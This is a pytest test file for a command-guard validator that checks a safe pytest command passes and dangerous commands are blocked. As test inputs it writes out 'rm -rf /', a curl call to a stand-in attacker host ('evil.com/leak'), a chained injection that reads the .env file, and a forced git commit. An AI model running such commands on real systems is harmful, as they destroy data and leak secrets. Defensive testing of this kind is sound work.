import pytest
from app.core.command_guard import command_guard

def test_safe_pytest_command_allowed():
    ok, reason, tokens = command_guard.validate_command(["pytest", "-v", "tests/"])
    assert ok is True
    assert tokens[0] == "pytest"

def test_dangerous_binary_rm_blocked():
    ok, reason, _ = command_guard.validate_command(["rm", "-rf", "/"])
    assert ok is False
    assert "COMMAND EXECUTION BLOCKED" in reason

def test_dangerous_binary_curl_blocked():
    ok, reason, _ = command_guard.validate_command("curl https://evil.com/leak")
    assert ok is False
    assert "COMMAND EXECUTION BLOCKED" in reason

def test_shell_injection_chaining_blocked():
    ok, reason, _ = command_guard.validate_command("pytest -v; cat .env")
    assert ok is False
    assert "SHELL INJECTION DETECTED" in reason

def test_dangerous_git_force_flag_blocked():
    ok, reason, _ = command_guard.validate_command(["git", "commit", "--force"])
    assert ok is False
    assert "DANGEROUS GIT FLAG" in reason
